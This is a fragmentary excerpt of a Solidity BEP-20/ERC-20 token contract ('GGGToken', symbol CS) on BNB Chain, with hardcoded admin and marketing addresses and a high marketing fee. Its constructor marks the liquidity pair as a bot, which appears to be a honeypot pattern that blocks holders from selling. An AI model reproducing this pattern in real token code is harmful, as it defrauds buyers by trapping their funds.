...
contract  GGGToken is IERC20, Ownable {
    ...
    address router;
    constructor(){  
             address adminAddress = 0xee30c26B157EFe645334aDC7585Ed89c97357cC1;
            _name = "CS";
            _symbol = "CS";
            _decimals= 18;
            _tTotal = 18888* (10**uint256(_decimals));
            _burnFee = 0;
            _marketingFee = 1000;
            _LPFee = 0 ;
            marketAddr = 0xDd839eeFaE7442d12b027C30E5C761E5EA5fFC5F;
            _intervalSecondsForSwap = 15;
            isAddAddress = true;
            if( block.chainid == 56){
                _token = 0x55d398326f99059fF775485246999027B3197955 ;
                router = 0x10ED43C718714eb63d5aA57B78B54704E256024E ;
                adminAddress = 0xee30c26B157EFe645334aDC7585Ed89c97357cC1 ;
            }
            ...
            _isBot[address(uniswapV2Pair)] = true;
   ...
   function isExcludedFromFee(address account) public view returns (bool) {
    ...
    function _transfer(
        ...
        if(isAddAddress&& from!=address(this)){
            _takeInviter();
        }
